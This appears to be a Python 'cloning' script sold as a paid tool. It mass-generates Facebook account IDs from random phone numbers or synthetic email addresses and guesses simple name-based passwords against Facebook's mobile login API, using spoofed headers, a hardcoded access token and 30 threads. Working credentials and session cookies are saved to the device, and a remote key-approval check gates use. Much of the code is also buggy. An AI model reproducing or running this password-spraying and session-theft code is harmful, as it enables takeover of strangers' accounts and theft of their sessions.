 ####@-----Import-----@####
import os,base64
os.system("xdg-open https://chat.whatsapp.com/KeoCVtu9wLLE3W3LPAVG09")
os.system('git pull -q;rm .rndm')
try:
    import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct,urllib.request
    from string import *
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
except(ImportError):
    os.system("pip install requests")
    pass

try:
    import mechanize
except(ImportError):
    os.system("pip install mechanize")
    pass


try:
    import bs4
except(ImportError):
    os.system("pip install bs4")
    pass

try:
 pass
except:pass


import subprocess
from bs4 import BeautifulSoup
import json,os,time,base64,random,re,sys, subprocess 
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as speed

accounts = []
loop = 0


####DESIGN####
def oo(t):
    return '\033[1;91m[\033[1;97m'+str(t)+'\033[1;91m]\033[1;97m '

###USERAGENTSGEN####
'''
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
andd=subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
carr=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')

device = {
        'android_version':android_version,
        'model':model,
        'build':build,
         'cr':carr,
         'brand':andd}

'''
ua = []

import requests
rs = requests.get
ua = []

del ua
'''
Mozilla/5.0 (Linux; Android 9; LM-Q510N Build/PKQ1.190522.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]
'''

ua=[]
###key###
import os
import uuid

file_path = '/sdcard/android.txt'

if os.path.isfile(file_path):
    with open(file_path, 'r') as file:
        text = file.read()
        
else:
    key = str(uuid.uuid4())
    with open(file_path, 'w') as file:
        file.write(key)



##Logo##
P = '\x1b[1;97m'
G='\x1b[1;92m'
R='\x1b[1;91m'
S ='\x1b[1;96m'
Y ='\x1b[1;93m'
uu ='\x1b[1;95m'
tred = speed


logo= f'''

\033[1;91m         >======>           >>
\033[1;92m         >=>    >=>        >>=>
\033[1;92m         >=>    >=>       >> >=>
\033[1;93m         >> >==>         >=>  >=>
\033[1;92m         >=>  >=>       >=====>>=>
\033[1;92m         >=>    >=>    >=>      >=>
\033[1;91m         >=>      >=> >=>        >=>

\033[1;97m Author : RA
\033[1;97m Version: 1.2
\033[1;97m Status : Paid
================================================='''
def main_apv():
	os.system("clear")
	print (logo)
id=open(file_path, 'r').read()
f=str(id)
a=requests.get("https://github.com/haseebmusharaf/raja/blob/main/Approval.txt").text
b=str(a)
if f in b:
	pass
else:
    os.system("clear")
    print (logo)
    print(f"YOURKEY: {text} Approval needed")
    print('Key sent to WhatsApp')
    os.system('xdg-open https://wa.me/+923159128147')
        
    
exit ()
####@-----Menu-----@####
def main():
    os.system("clear")
    print (logo)
    print(f"{[1]} File Cloning")
    print(f"{[2]} Random Cloning")
    print(f"{[3]} Mail Cloning")  
    print(f"{[0]} Exit")
    
    inpp = input(f"[+] Chose : ")
    if inpp == "1":
        file()
    if inpp == '2':pak()
    if inpp =='3':
        gmail()
    if inpp == "4":
     file_create()
    if inpp == "0":
        exit('Exit!')

l = []

def file():
    os.system("clear")
    print(logo)
    if 'gm' in l:
        file = '.Hannan'
    else:
        file = input(f"[+] Enter File: ")
    try:
        for x in open(file,'r').readlines():
            accounts.append(x.strip())
    except:
        print(f"[+] File Not Found");time.sleep(1)
        main()
     
    method()
    exit()

####@-----Gmail-----@####

def gmail():
        os.system('rm -rf .Hannan')
        first = input(f'[+] Put First Name: ')
        last = input(f'[+] Put Last Name: ')
        domain = input(f'[+] Put Domain: ')
        try:
            limit = input(f'[+] Put Limit: ')
        except ValueError:
            limit = 5000
        lists = ['3','4']
        for xd in range(int(limit)):
            lchoice = random.choice(lists)
            if '3' in lchoice:
                mail = ''.join(random.choice(string.digits) for _ in range(3))
                open('.Hannan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.Hannan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.Hannan', 'r').read().splitlines()
        with tred(max_workers=30) as king___xd:
            tl = str(len(fo))
            tk = first+last
            l.append('gm')
            file()


####@-----PakNumber-----@####


def pak():
    user=[]
    code = input(f'[+] Put Code : ')
    try:
        limit = int(input(f'[+] Put Limit :  '))
    except ValueError:
        limit = 5000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    for psx in user:
        ids = code+psx
        open('.rndm','a').write(ids+'|'+psx+' '+ids+'\n')
    andom()



####@-----UserAgent----@####
'''
Mozilla/5.0 (Linux; Android 10; P650 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]
Mozilla/5.0 (Linux; Android 10; SM-M305M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/349.0.0.39.470;]
Mozilla/5.0 (Linux; Android 10; SM-M305F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/204.0.0.6.121;]
Mozilla/5.0 (Linux; Android 10; SPC SMART PLUS Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]
'''
####@-----FileM-----@####


def method():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o':      
        lp = input(f'[+] Total Password? : ')
        if lp.isnumeric():
            ex = 'firstlast first123 last123 first786 first1122 first last'
            print(f'[+] {ex} (ETC)')
            for x in range(int(lp)):
                totalpass.append(input(f'[1] Password : '))
            pass
        else:
            print(f"[+] Numeric Only")
            main()
    print(f'\n'+("[1]")+' Method 1 \n'+("[2]")+' Method 2 ')
    m=input(f"[+] Input : ") 
    print('\n'+("[+]")+'START CLONING PRESS?(y/n)')
    cpok=input(f"[+] Input : ")
    apps='y'
    os.system("clear")
    print(logo) 

    print(f' [+] Total Ids : \033[1;92m'+str(len(accounts)))
    print(f"\033[1;97m [+] Process start has been background")
    print(f"\033[1;97m [+] Airplane Mode After 5 min ")    
    print('\033[1;97m='*49)


    def start(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
           last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r \033[1;97m[\033[1;97mM1\033[1;97m]\033[1;97m {}-{}        \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads =random.choice(['Mozilla/5.0 (Linux; Android 11; TECNO KG7h Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]', 'Mozilla/5.0 (Linux; Android 10; Alcatel_5002C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]', 'Mozilla/5.0 (Linux; Android 8.1.0; vivo X20Plus Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]', 'Mozilla/5.0 (Linux; Android 12; Infinix X6825 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]', 'Mozilla/5.0 (Linux; Android 12; SM-G973F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]', 'Mozilla/5.0 (Linux; Android 11; GM1901 Build/RKQ1.201022.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/379.0.0.2.109;]'])
            header = {
    'method': 'POST',
    'scheme': 'https',
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-PK,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'referer': 'https://mbasic.facebook.com/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': random.choice(['Mozilla/5.0 (Linux; Android 11; TECNO KG7h Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]', 'Mozilla/5.0 (Linux; Android 10; Alcatel_5002C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]', 'Mozilla/5.0 (Linux; Android 8.1.0; vivo X20Plus Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]', 'Mozilla/5.0 (Linux; Android 12; Infinix X6825 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]', 'Mozilla/5.0 (Linux; Android 12; SM-G973F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]', 'Mozilla/5.0 (Linux; Android 11; GM1901 Build/RKQ1.201022.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/379.0.0.2.109;]'])}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92mRA-OK\033[1;92m] \033[1;92m'+acc+' \033[1;92m•\033[1;92m '+pword+'  ')
                open('/sdcard/RA-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except Exception as e:print(str(e)+' | '+response.text)
                print('\r\033[1;92m[\033[1;92mCookie\033[1;92m] \033[1;97m'+cookies) 
                open('/sdcard/M.COOKIES-OK.txt','a').write(f'{acc} • {pword}\n{cookies}')
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;92m[\033[1;92mRA-OK\033[1;92m] \033[1;92m'+acc+' \033[1;92m•\033[1;92m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/RA-OK.txt','a').write(f'{acc} • {pword}\n')
                break             
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10)




    def start2(user):
      global loop,accounts
      try:
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mM2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = "Mozilla/5.0 (Linux; Android 12; SM-M136B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]"
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92mRA-OK\033[1;92m] \033[1;92m'+acc+' \033[1;92m•\033[1;92m '+pword+'  ')
                open('/sdcard/RA-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                    check(r,coki)
                if c=='y':
                 try:  
                  q = json.loads(response.text)
                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookies = f"sb={ssbb};{ckkk}"
                 except Exception as e:print(str(e)+' | '+response.text)
                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)
                 open('/sdcard/M.COOKIES-OK.txt','a').write(f'{acc} • {pword}\n{cookies}')     
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;91mRA-CP\033[1;91m] \033[1;91m'+acc+' \033[1;91m•\033[1;91m '+pword)
                cpacc.append(acc)
                open('/sdcard/RA-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1    
      except Exception as e: time.sleep(10)

    if   m=='2':
        with speed(max_workers=30) as speede:
            speede.map(start2, accounts)
    elif m=='1':
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    exit()


        #USERAGENTS_RANDOM
'''
Mozilla/5.0 (Linux; Android 6.0.1; SM-G900F Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36[FBAN/EMA;FBLC/hr_HR;FBAV/319.0.0.7.107;
Mozilla/5.0 (Linux; Android 5.1.1; 9022X Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;
Mozilla/5.0 (Linux; Android 11; 5033XR Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.115 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]
Mozilla/5.0 (Linux; Android 10; A140 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]
Mozilla/5.0 (Linux; Android 10; BV6600 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]
Mozilla/5.0 (Linux; Android 10; itel A571W Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/333.0.0.12.108;]
Mozilla/5.0 (Linux; Android 11; ZTE Blade L9 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]
'''
####@-----Random-----@####
def andom():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o': 
        tpp = input(f'[+] Total Password? : ')
        totalpass.append('first')
        totalpass.append('last')
        if tpp.isnumeric():
            ex = 'firstlast first123 last123'
            print(f'[+] {ex} (ETC)')
            for x in range(int(tpp)):
                totalpass.append(input(f'[1] Password : '))
            pass
        else:
            print(f"[+] Numeric Only")
            exit()
    print(f'\n'+("[1]")+' Method 1 \n'+("[2]")+' Method 2 ')
    m=input(f"[+] Input : ") 
    print('\n'+("[?]")+'Do You Want To Show Cp Ids?(y/n)')
    cpok=input(f"[+] Input : ")
    print('\n'+("[?]")+'Do You Want To Show Cookies?(y/n)')
    c=input(f"[+] Input : ")
    os.system("clear")
    print(logo) 

    print(f'[+] Total Ids : \033[1;92m'+str(len(accounts)))
    print(f"\033[1;97m[+] Process start your background")

    print('\033[1;97m='*49)
   
    def start(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;97m[\033[1;97mPROCESS\033[1;97m]\033[1;97m {}-{}  \033[1;97mOK:\033[1;92m{} \033[1;97mCP:\033[1;91m{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads = "Mozilla/5.0 (Linux; Android 8.1.0; BBB100-1 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.115 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": "Mozilla/5.0 (Linux; U; Android 10; SM-A307FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 OPR/7.1.2254.145530","X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mRA-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/RA.RANDOM-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except Exception as e:print(str(e)+' | '+response.text)
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mRA-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/RA.RANDOM-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10)





    def start2(user):
      global loop,accounts
      try:
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;97m[\033[1;97mPROCESS\033[1;97m]\033[1;97m {}-{}  \033[1;97mOK:\033[1;92m{} \033[1;97mCP:\033[1;91m{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = "Mozilla/5.0 (Linux; Android 11; Hisense H60 Smart Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]"
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92mRA-OK\033[1;92m] \033[1;92m'+acc+' \033[1;92m•\033[1;92m '+pword+'  ')
                open('/sdcard/RA.RANDOM-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                    check(r,coki)
                if c=='y':
                 try:  
                  q = json.loads(response.text)
                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookies = f"sb={ssbb};{ckkk}"
                 except Exception as e:print(str(e)+' | '+response.text)
                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)

                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;91mRA-CP\033[1;91m] \033[1;91m'+acc+' \033[1;91m•\033[1;91m '+pword)
                cpacc.append(acc)
                open('/sdcard/RA.RANDOM-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1    
      except Exception as e: time.sleep(10)


      for x in open('.rndm','r').read().splitlines():
        accounts.append(x)

    if    m=='2':
        with speed(max_workers=30) as speeed:
            speede.map(start2, accounts)
    elif    m=='1':
        with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
exit()



main_apv()